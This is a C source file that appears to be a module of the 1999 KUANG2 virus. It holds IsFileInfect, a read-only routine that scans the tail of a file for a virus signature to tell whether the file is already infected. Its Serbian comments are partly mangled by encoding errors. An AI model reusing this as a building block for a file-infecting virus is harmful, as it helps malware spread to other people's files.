/***[ThuNderSoft]*************************************************************
							  KUANG2: IsFileInfect
								   ver: 0.10
								úùÄÍ WEIRD ÍÄùú
*****************************************************************************/

/* HISTORY */
// ver 0.10 (12-may-1999): born code

#include <windows.h>
#include <strmem.h>

// minimalna veliina fajla	 ( < veliine dodatog virusa)
#define		MIN_FILE_LEN	9000
// koliko od kraja fajla treba poeti skeniranje ( > veliine dodatog virusa)
#define		FROM_END		12500

/*
	IsFileInfect
	------------
  ş proverava da li je neki fajl ve† inficiran.
  ş mora posebno jer vr„i samo itanje.
  ş vra†a -1 za tehnike probleme, 0 za ist fajl, 1 za inficiran
  ş indetino u virusu i antivirusu
  ş brz i inteligentan. */

int IsFileInfect(char *fname, char* virus_sign) {
	HANDLE hfile, hfilemap;
	char *filemap, *filestart;
	DWORD fattr;
	DWORD fsize;
	unsigned int retvalue;
	unsigned int koliko;

	retvalue=-1;						// oznai tehniku gre„ku (default)

	fattr=GetFileAttributes(fname);		// uzmi atribute fajla

	// otvaramo fajl
	hfile=CreateFile(fname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, fattr, NULL);
	if (hfile==INVALID_HANDLE_VALUE) goto end1;

	// uzmi veliinu fajla
	fsize=GetFileSize(hfile, NULL);
	if (fsize==0xFFFFFFFF) goto end2;	// gre„ka
	if (fsize<MIN_FILE_LEN) {			// ako je veliina fajla manja
		retvalue=0;						// od veliine dodatog virusa
		goto end2;						// znai da je fajl ist (0)
	}

	// kreiramo MMF
	hfilemap=CreateFileMapping (hfile, NULL, PAGE_READONLY, 0, fsize, NULL);
	if (hfilemap==NULL) goto end2;
	// kreiramo MMF view na ceo fajl
	filemap=(void *) MapViewOfFile (hfilemap, FILE_MAP_READ, 0,0,0);
	if (filemap==NULL) goto end3;
	filestart=filemap;

	// odredi poetak skeniranja...
	if (fsize>FROM_END) {				// ako je fajl ve†i od FROM_END
		filemap+=(fsize-FROM_END);		// pomeri se tako da ima FROM_END do kraja
		koliko=FROM_END;				// oznai koliko ima za skeniranje
	} else koliko=fsize;				// oznai da se ceo fajl skenira

	// proveri da li je ve† zara‚en (ak 50 znakova!)
	if (memfind(filemap, koliko, virus_sign, 50)!=-1)
		retvalue=1;					// zara‚en fajl
		else retvalue=0;			// ist fajl

	UnmapViewOfFile(filestart); // zatvari MMF view
end3:
	CloseHandle(hfilemap);		// zatvori MMF
end2:
	CloseHandle(hfile);			// zatvori fajl
end1:
	return retvalue;			// vrati rezultat
}

